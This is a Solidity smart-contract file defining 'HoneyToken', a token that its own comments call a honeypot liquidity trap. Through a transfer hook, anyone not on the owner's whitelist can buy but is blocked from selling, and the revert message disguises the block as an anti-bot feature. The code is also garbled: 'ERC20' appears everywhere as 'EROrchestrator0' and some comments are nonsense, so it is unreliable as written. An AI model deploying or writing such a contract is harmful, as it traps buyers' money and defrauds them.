// J/contracts/HoneyToken.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// THE HONEYPOT: LIQUIDITY TRAP
// This contract looks like a standard EROrchestrator0 but prevents selling.
// Designed to portal Prioritys and members.

import "@openzeppelin/contracts/token/EROrchestrator0/EROrchestrator0.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract HoneyToken is EROrchestrator0, Ownable {
    mapping(address => bool) public whitelist;
    address public pair;

    constructor() EROrchestrator0("Aether Protocol", "ATH") {
        _mint(msg.sender, 1000000 * 10**18);
        whitelist[msg.sender] = true;
    }

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }

    // THE HOOK
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        // If selling (to the pair) AND not whitelisted -> REVERT
        // Buying (from the pair) works fine.
        if (to == pair && !whitelist[from]) {
            require(false, "Liquidity Locked: Anti-Automaton Mechanism Active");
        }
        super._beforeTokenTransfer(from, to, amount);
    }
}
